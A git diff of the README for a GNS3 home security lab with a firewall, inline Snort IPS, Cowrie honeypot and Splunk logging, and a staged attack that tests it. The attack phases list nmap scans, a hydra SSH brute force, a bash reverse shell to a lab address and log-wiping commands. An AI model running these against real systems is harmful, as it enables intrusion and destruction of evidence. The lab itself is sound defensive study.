@@ -1,4 +1,4 @@
-# Operation Phantom Web, GNS3 Network Security Lab
+# Gate Guardian, GNS3 Network Security Lab
 
 This is a network security lab I built in GNS3. It has different zones, and it shows how layered defense works, a firewall, an intrusion detection system, a honeypot that tricks attackers, and a logging system that saves everything. I also ran a full attack on it to test if the defenses actually work.
 
@@ -7,7 +7,6 @@ This is a network security lab I built in GNS3. It has different zones, and it s
 This lab is a small copy of how an enterprise network can be protected. The idea was not just to read about these things, but to actually build them and attack the network myself, to see if each layer really does its job, detecting the attacker, stopping them, and logging what happened.
 
 **Stack:**
-
 - **OPNsense**, the firewall and gateway
 - **Snort**, inline IPS running on a transparent bridge (`br0`)
 - **Cowrie**, SSH honeypot
@@ -18,19 +17,17 @@ This lab is a small copy of how an enterprise network can be protected. The idea
 
 ## What's Inside
 
-|File / Folder|What It Is|
-|---|---|
-|`topology.gns3`|The GNS3 project file, has the full topology and all the connections|
-|`VMs/appliance.ova`|Option A, one OVA file with all the VirtualBox VMs inside|
-|`VMs/individual/`|Option B, each VM in its own compressed file, use this if the OVA fails|
-|`VMs/images.zip`|QEMU images, needed no matter which option you use|
-|`configs backup/Router One.txt`|Full running config for Router One|
-|`configs backup/Router Two.txt`|Full running config for Router Two|
-|`configs backup/L3Switch One.txt`|Full running config for L3Switch One|
-|`configs backup/L3Switch Two.txt`|Full running config for L3Switch Two|
-|`symbols/`|The symbols used to draw the topology|
-|`docs/`|The phase write ups and the attack scenario documentation|
-|`README.md`|This file|
+| Folder / File       | What It Is                                                                 |
+| --------------------- | ----------------------------------------------------------------------------- |
+| `assets/`            | The topology diagram and other images used in this README                 |
+| `configs/`           | Full running config backups for Router One, Router Two, L3Switch One, L3Switch Two |
+| `docs/`              | The three phase write ups and the attack scenario documentation, as PDFs   |
+| `project symbols/`   | The custom symbols used to draw the topology in GNS3                       |
+| `topology/`          | The GNS3 project file, holds the full topology and all the connections     |
+| `.gitignore`         | Keeps VM disk images, logs, and secrets out of the repository              |
+| `README.md`          | This file                                                                   |
+
+Note, the actual VM disk images, Cisco device images, and Splunk install files are not included in this repository. Some of that is proprietary software with licensing restrictions, and some of it is just too large for GitHub. The section below walks you through getting everything yourself.
 
 ## Requirements
 
@@ -41,46 +38,36 @@ Before starting, make sure you have these installed:
 
 ## Setup
 
-### 1. Import the VMs
+### 1. Get the VMs and Images Yourself
 
-There are two options. Try Option A first, if it fails, go with Option B, both give the same result.
+Nothing here is pre packaged, since some of these are licensed products I cannot redistribute. Here is what you need, and where to get it:
 
-**Option A, OVA file (easier):**
+- **OPNsense**, free download from opnsense.org, install it as a VM in VirtualBox
+- **Kali Linux**, free download from kali.org, used for the attacker machine and the management console
+- **Ubuntu Server**, free download from ubuntu.com, this is the base image I cloned for the Web Server, Mail Server, Honeypot, Snort box, and AAA server, then configured each one differently on top of it
+- **Snort**, installed on top of an Ubuntu Server VM, source and install instructions at snort.org
+- **Cowrie**, open source honeypot, cloned from its GitHub repository and set up as described in `docs/`
+- **FreeRADIUS**, installed with `apt install freeradius` on Ubuntu Server
+- **Splunk Enterprise**, free trial download from splunk.com, this one is a commercial product, so get it directly from Splunk rather than from any third party copy
+- **Cisco vIOS router and switch images**, these are licensed by Cisco. You need your own copy through a legitimate source, such as a Cisco learning lab bundle you already have access to, these cannot legally be shared or redistributed, including on sites like this one
 
-1. Open VirtualBox
-2. Go to File, then Import Appliance
-3. Select `appliance.ova`
-4. Click Next, then Import
-5. Wait, it can take several minutes
+Once you have all of these, build each VM, set its IP address to match the table below, and import it into GNS3 as a node.
 
-**Option B, import VMs one by one (if the OVA fails):**
+Expected devices once everything is built:
 
-1. Extract each file inside `VMs/individual/`
-2. In VirtualBox, go to Machine, then Add
-3. Select the `.vbox` file
-4. Do this for every VM
+| VM / Device       | IP Address         |
+| ------------------- | --------------------- |
+| OPNsense           | multiple interfaces |
+| Web Server          | 192.168.30.10         |
+| Mail Server         | 192.168.30.20         |
+| Honeypot (Cowrie)   | 192.168.30.30         |
+| Snort IPS           | 192.168.30.40         |
+| Splunk SIEM         | 192.168.100.10       |
+| AAA Server          | 192.168.100.20       |
+| Management Node     | 192.168.100.20 (temporary) |
+| Attacker Machine    | 10.10.10.2             |
 
-Important, the import order matters. Three of the VMs are linked base images that the other VMs depend on, and they must be imported first, or you will get a "parent UUID not found" error. These are:
-
-1. The Kali based attacker VM
-2. The Snort server base image
-3. The small management browser base image
-
-Do not rename or delete these three after importing, other VMs are linked to them by their internal UUID, and renaming breaks the link without any warning.
-
-After importing, you should see these VMs:
-
-|VM|IP Address|
-|---|---|
-|OPNsense|multiple interfaces|
-|Web Server|192.168.30.10|
-|Mail Server|192.168.30.20|
-|Honeypot (Cowrie)|192.168.30.30|
-|Snort IPS|192.168.30.40|
-|Splunk SIEM|192.168.100.10|
-|AAA Server|192.168.100.20|
-|Management Node|192.168.100.20 (temporary)|
-|Attacker Machine|10.10.10.2|
+Important, the import order matters once your VMs exist. Three of them, the Kali based attacker VM, the Snort server base image, and the small management browser base image, should be imported into VirtualBox first, since other VMs may be linked base clones of them. If you clone from them later, do not rename or delete these three afterward, a clone is linked to its parent by internal UUID, and renaming the parent breaks the link without any warning.
 
 ### 2. Import the GNS3 Appliances
 
@@ -94,19 +81,17 @@ This is needed because VirtualBox and QEMU both try to use hardware acceleration
 
 ### 3. Open the Topology
 
-In GNS3, go to File, then Open Project, and select the project file. The whole topology loads with everything already connected.
+In GNS3, go to File, then Open Project, and select the project file inside `topology/`. The whole topology loads with everything already connected.
 
 ### 4. Start the Lab, Order Matters
 
 **Start network devices first:**
-
 1. OPNsense (wait about 60 seconds for it to finish booting)
 2. Router One and Router Two
 3. L3Switch One and L3Switch Two
 4. Access layer switch and the other built in GNS3 switches
 
 **Then start the VMs:**
-
 1. Snort (starts first, because all DMZ traffic has to pass through it)
 2. Web Server, Mail Server, Honeypot
 3. Splunk, AAA Server
@@ -118,7 +103,7 @@ In GNS3, go to File, then Open Project, and select the project file. The whole t
 The `.gns3` file saves the wiring, but the router and switch configs live in NVRAM. If the configs are missing after opening the project:
 
 1. Right click the device, then Console
-2. Paste the matching file from `configs backup/`
+2. Paste the matching file from `configs/`
 3. Run `write memory`
 
 Note, the L3 switch configs need `vtp mode transparent`, without it, the VLANs do not survive a reboot.
@@ -134,7 +119,8 @@ sudo snort \
   > /path/to/my_logs.txt &
 ```
 
-Check it is running: `ps aux | grep snort` Watch the alerts live: `tail -f /path/to/my_logs.txt`
+Check it is running: `ps aux | grep snort`
+Watch the alerts live: `tail -f /path/to/my_logs.txt`
 
 Snort runs as an inline IPS on a transparent bridge (`br0`). All DMZ traffic physically passes through it. It is invisible to the attacker, but it can still drop bad packets in real time.
 
@@ -170,7 +156,6 @@ Then open the browser inside that VM and go to `http://<splunk ip>:8000`. This l
 All attacks are run from the attacker machine. This is "Operation Phantom Web", a staged attack meant to test every defense layer, one at a time.
 
 ### Phase 1, Reconnaissance
-
 ```bash
 # Discover live hosts
 nmap -sn 192.168.30.0/24
@@ -189,18 +174,15 @@ nc -v 192.168.30.30 22
 ```
 
 ### Phase 2, SSH Brute Force
-
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt \
   -t 4 -w 3 -f -V \
   -o /tmp/hydra_results.txt \
   ssh://192.168.30.30
 ```
-
 Cowrie accepts a weak password on purpose, to pull the attacker in. From here, every command the attacker types gets logged.
 
 ### Phase 3, Inside the Honeypot
-
 ```bash
 ssh root@192.168.30.30
 # Everything from here runs inside Cowrie, it is fake, but it is all logged
@@ -213,7 +195,6 @@ arp -a
 ```
 
 ### Phase 4, Lateral Movement (gets blocked)
-
 ```bash
 ping -c 3 192.168.20.1
 ping -c 3 192.168.21.1
@@ -221,17 +202,14 @@ ping -c 3 192.168.100.10
 ssh root@192.168.20.1
 bash -i >& /dev/tcp/10.10.10.2/4444 0>&1
 ```
-
 All of this is blocked by OPNsense. The DMZ cannot reach the internal VLANs or the management zone.
 
 ### Phase 5, Covering Tracks (does nothing)
-
 ```bash
 history -c
 cat /dev/null > ~/.bash_history
 rm -rf /var/log/*
 ```
-
 Everything was already sent to Splunk in real time, so deleting the local logs changes nothing.
 
 ## Checking the Attack in Splunk
@@ -254,27 +232,48 @@ index=main sourcetype=syslog
 
 ## Network Reference
 
-|Device|Interface|IP Address|Role|
-|---|---|---|---|
-|OPNsense|WAN|10.10.10.1/24|External gateway|
-|OPNsense|LAN_R1|10.0.0.1/30|Router One link|
-|OPNsense|LAN_R2|10.0.0.5/30|Router Two link|
-|OPNsense|MGMT|192.168.100.1/24|Management zone|
-|OPNsense|DMZ|192.168.30.1/24|DMZ zone|
-|Router One|gi0/0|10.0.0.2/30|OPNsense link|
-|Router Two|gi0/0|10.0.0.6/30|OPNsense link|
-|Web Server|n/a|192.168.30.10/24|Apache HTTP/HTTPS|
-|Mail Server|n/a|192.168.30.20/24|Postfix SMTP|
-|Honeypot|n/a|192.168.30.30/24|Cowrie SSH trap|
-|Snort|br0|192.168.30.40/24|Inline IPS bridge|
-|Splunk|n/a|192.168.100.10/24|SIEM, port 8000|
-|AAA Server|n/a|192.168.100.20/24|FreeRADIUS, port 1812|
-|Attacker Machine|n/a|10.10.10.2/24|Attack simulation|
-|HR VLAN|n/a|192.168.20.0/24|Internal users|
-|IT VLAN|n/a|192.168.21.0/24|Internal users|
-|Finance VLAN|n/a|192.168.22.0/24|Internal users|
-|Sales VLAN|n/a|192.168.23.0/24|Internal users|
-|VPN Tunnel|n/a|10.8.0.0/24|OpenVPN clients|
+| Device            | Interface      | IP Address         | Role               |
+| ------------------ | --------------- | -------------------- | -------------------- |
+| OPNsense          | WAN             | 10.10.10.1/24        | External gateway    |
+| OPNsense          | LAN_R1          | 10.0.0.1/30           | Router One link      |
+| OPNsense          | LAN_R2          | 10.0.0.5/30           | Router Two link      |
+| OPNsense          | MGMT            | 192.168.100.1/24     | Management zone      |
+| OPNsense          | DMZ             | 192.168.30.1/24      | DMZ zone              |
+| Router One        | gi0/0           | 10.0.0.2/30           | OPNsense link         |
+| Router Two        | gi0/0           | 10.0.0.6/30           | OPNsense link         |
+| Web Server         | n/a             | 192.168.30.10/24     | Apache HTTP/HTTPS    |
+| Mail Server        | n/a             | 192.168.30.20/24     | Postfix SMTP          |
+| Honeypot           | n/a             | 192.168.30.30/24     | Cowrie SSH trap       |
+| Snort              | br0             | 192.168.30.40/24     | Inline IPS bridge    |
+| Splunk             | n/a             | 192.168.100.10/24    | SIEM, port 8000       |
+| AAA Server         | n/a             | 192.168.100.20/24    | FreeRADIUS, port 1812 |
+| Attacker Machine   | n/a             | 10.10.10.2/24          | Attack simulation     |
+| HR VLAN            | n/a             | 192.168.20.0/24      | Internal users        |
+| IT VLAN            | n/a             | 192.168.21.0/24      | Internal users        |
+| Finance VLAN       | n/a             | 192.168.22.0/24      | Internal users        |
+| Sales VLAN         | n/a             | 192.168.23.0/24      | Internal users        |
+| VPN Tunnel         | n/a             | 10.8.0.0/24            | OpenVPN clients       |
+
+## Software and Image Versions
+
+This is what I know for certain, and how to check the rest on your own build, since versions can drift depending on when you download each tool.
+
+| Component          | Version Used                       | How I Know / How To Check It Yourself |
+| -------------------- | ------------------------------------- | ---------------------------------------- |
+| GNS3                | 2.2.58.1                             | Confirmed, shown in GNS3 under Help, then About |
+| Oracle VirtualBox    | 7.0                                  | Confirmed, shown in VirtualBox under Help, then About VirtualBox, gives the exact build number too |
+| Splunk Enterprise    | 9.2.1                                | Confirmed, this was the exact version downloaded during setup (`splunk-9.2.1-...-amd64.deb`), also visible once installed, log in and check the bottom of any page, or run `/opt/splunk/bin/splunk version` |
+| Kali Linux           | 2026.1                               | Confirmed, this was the base image filename used (`kali-linux-2026.1-virtualbox-amd64`) |
+| OPNsense             | Not recorded                         | Check it yourself, log into the web interface, the version shows on the Dashboard page, or go to System, then Firmware, then Status |
+| Snort                | Not recorded, but it is Snort 3 (uses `snort3-master` and `snort.lua`) | Check it yourself, run `snort -V` on the Snort VM |
+| Cowrie               | Not recorded                         | Check it yourself, inside the Cowrie folder run `cat cowrie/VERSION` if that file exists, or check the git log with `git log -1` if it was cloned from GitHub |
+| FreeRADIUS           | Not recorded, installed via `apt install freeradius` on Ubuntu | Check it yourself, run `freeradius -v` on the AAA server |
+| Ubuntu Server (base image for Web, Mail, Honeypot, Snort, AAA) | Not recorded | Check it yourself, run `lsb_release -a` or `cat /etc/os-release` on any of those VMs |
+| Cisco vIOS (routers and L3 switches) | Not recorded | Check it yourself, console into the device and run `show version` |
+| Apache (Web Server)  | Not recorded                         | Check it yourself, run `apache2 -v` |
+| Postfix (Mail Server) | Not recorded                        | Check it yourself, run `postconf mail_version` |
+
+If you are rebuilding this lab, I would recommend running these version check commands on your own build and filling this table in properly, it makes the documentation far more useful to anyone trying to reproduce your results exactly.
 
 ## Notes and Known Limitations
 
